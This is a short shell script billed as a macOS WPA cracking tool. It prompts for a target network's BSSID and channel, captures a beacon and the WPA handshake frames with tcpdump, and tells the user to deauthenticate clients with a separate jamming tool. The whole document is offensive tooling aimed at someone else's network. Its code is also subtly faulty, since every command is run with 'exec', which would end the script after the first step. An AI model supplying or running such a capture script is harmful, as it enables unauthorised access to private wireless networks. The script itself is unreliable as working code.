#!/bin/sh




echo "macOS 95% native WPA cracking tool"
echo "Please enter the BSSID of the target: "
read BSSID
echo "Please enter the WiFi channel of the target:"
read CHANNEL
echo "Now setting up system"
exec airport -z
exec airport -c$CHANNEL
echo "Collecting beason frame..."
exec tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en1 -w beacon.cap
echo "Beacon frame collected, now beginning collection of handshake, please use WifiJam to deauth a target"
exec tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en1 -w handshake.cap
echo "handshake frames collected"
echo "now merging files"
exec mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap

